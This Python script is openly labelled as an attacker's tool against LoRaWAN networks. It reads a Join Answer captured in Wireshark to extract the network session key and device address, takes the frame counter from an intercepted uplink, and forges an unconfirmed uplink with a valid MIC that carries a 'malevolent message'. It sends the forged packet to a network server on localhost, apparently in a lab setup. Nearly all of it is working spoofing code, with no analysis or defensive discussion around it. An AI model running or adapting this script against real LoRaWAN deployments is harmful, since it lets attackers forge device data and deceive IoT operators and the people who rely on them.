import socket
from Crypto.Hash import CMAC
from Crypto.Cipher import AES

# Computes a 4-byte MIC using AES-CMAC
def generate_MIC(AESKey, payload):
    cmac_obj = CMAC.new(AESKey, ciphermod=AES)
    cmac_obj.update(payload)
    MIC = cmac_obj.digest()[:4]  # LoRaWAN uses only the first 4 bytes
    return MIC

# Builds and sends an Unconfirmed Uplink packet using a given AppSKey and NwkSKey
def uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, msg):
    MHDR = b'\x40'  # Unconfirmed Data Up
    FCtrl = b'\x00'
    FCnt += 1  # Increment frame counter
    FHDR = DevAddr + FCtrl + FCnt.to_bytes(2, 'little')
    FPort = b'\x01'  # Application default port
    direction = 0  # Uplink

    FRMPayload = encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, msg)
    MACPayload = FHDR + FPort + FRMPayload

    B0 = generate_block0(direction, DevAddr, FCnt, MACPayload)
    input_block = B0 + MHDR + MACPayload
    MIC = generate_MIC(NwkSKey, input_block)

    to_transmit_pkt = MHDR + MACPayload + MIC
    sock.sendto(to_transmit_pkt, ("127.0.0.1", 9000))  # Send to Network Server

    return FCnt

# Encrypts FRMPayload using AES in CTR-like mode (LoRaWAN-compliant)
def encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, plaintext):
    text_in_bytes = plaintext.encode()
    aes = AES.new(AppSKey, AES.MODE_ECB)
    block_size = 16
    n_blocks = (len(text_in_bytes) + block_size - 1) // block_size
    encrypted = b''

    for i in range(1, n_blocks + 1):
        Ai = (
            b'\x01' +                      # Block type = 0x01 for CTR-like
            b'\x00\x00\x00\x00' +          # Padding
            bytes([direction & 0xFF]) +    # Direction: 0 = uplink, 1 = downlink
            DevAddr[::-1] +                # DevAddr (little-endian)
            FCnt.to_bytes(4, 'little') +   # Frame counter
            b'\x00' +                      # Reserved
            bytes([i])                     # Block sequence number
        )
        Si = aes.encrypt(Ai)
        block = text_in_bytes[(i - 1)*block_size: i*block_size]
        encrypted += bytes(a ^ b for a, b in zip(block, Si))

    return encrypted

# Generates the B0 block for MIC computation
def generate_block0(direction, DevAddr, FCnt, MACPayload):
    B0 = (
        b'\x49' +                         # Block type = MIC
        b'\x00\x00\x00\x00' +             # Padding
        bytes([direction & 0xFF]) +       # Direction byte
        DevAddr[::-1] +                   # DevAddr (little-endian)
        FCnt.to_bytes(4, 'little') +      # Frame counter
        b'\x00' +                         # Reserved
        bytes([len(MACPayload)])          # MACPayload length
    )
    return B0

###################################################################################

AppSKey = bytes.fromhex('62EF6DC0FA4FF9A0B73E358E9EF7A5C3')  # Arbitrary AppSKey for spoofing

while True:
    # Get Join Accept packet directed to the NS captured from Wireshark (hex string without spaces)
    join_answer = input("Insert Join Answer packet containing NwkSKey (9001 -> 9000) from Wireshark: ")
    # Get intercepted unconfirmed uplink packet (used to extract FCnt)
    uul_pkt = input("Insert intercepted unconfirmed uplink packet from Wireshark: ")

    join_answer = bytes.fromhex(join_answer)
    uul_pkt = bytes.fromhex(uul_pkt)

    print(f"[ATTACKER] Intercepted Join Answer: {list(join_answer)}")
    print(f"[ATTACKER] Intercepted UpLink Packet: {list(uul_pkt)}")

    # Extract DevAddr and NwkSKey from the Join Answer
    DevAddr = join_answer[17:21]
    NwkSKey = join_answer[21:]

    # Extract and parse FCnt from intercepted uplink
    FCnt = uul_pkt[6:8]
    FCnt = int.from_bytes(FCnt, 'little')
    direction = 0  # Uplink

    # Compose and send a fake application-layer message
    mal_msg = input("Insert malevolent message: ")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    Fcnt = uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
    print("[ATTACKER] Malevolent message forwarded to NS")
    print("-------------------------------------------------")